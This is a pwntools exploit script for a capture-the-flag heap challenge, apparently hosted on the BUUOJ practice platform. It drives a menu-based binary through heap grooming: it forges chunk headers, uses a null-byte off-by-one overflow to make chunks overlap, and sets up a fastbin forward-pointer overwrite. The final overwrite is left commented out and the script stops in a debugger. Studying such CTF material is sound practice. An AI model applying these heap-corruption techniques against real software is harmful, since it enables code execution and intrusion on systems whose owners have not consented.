#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20001)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn')

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('Your Choice: ', str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('size: ', str(size))
	p.sendlineafter('content: ',content)
	print "add a chunk success"

def edit(idx, content):
	menu(3)
	p.sendlineafter('idx: ', str(idx))
	p.sendlineafter('content: ',content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(2)
	p.sendlineafter('idx: ', str(idx))
	print "free chunk %d success " % idx

def exploit():
	add(0x88, 'a'*0x10)			#0
	add(0x208, 'b'*0x10)		#1
	add(0x108, 'c'*0x10)		#2
	add(0x80, 'd'*0x10)			#3

	#fake
	edit(1, 'a'*0xf0 + p64(0x100) + p64(0x101))
	#into unsorted bin
	free(1)
	#null off by one
	free(0)
	add(0x88, 'a'*0x88)			#0

	#split from 1
	add(0x88, 'b1')				#1
	add(0x68, 'b2')				#4
	add(0x78, 'b3')				#5
	free(1)		
	free(2)						#overlapping above b

	gdb.attach(p, 'p puts')
	dbg()

	free(4)						#into fastbin
	add(0x310, 'over')			#1
	free(1)						


	#overwrite fastbin'fd
	#edit(1, )

	p.interactive()
	p.close()


if __name__ == '__main__':
	exploit()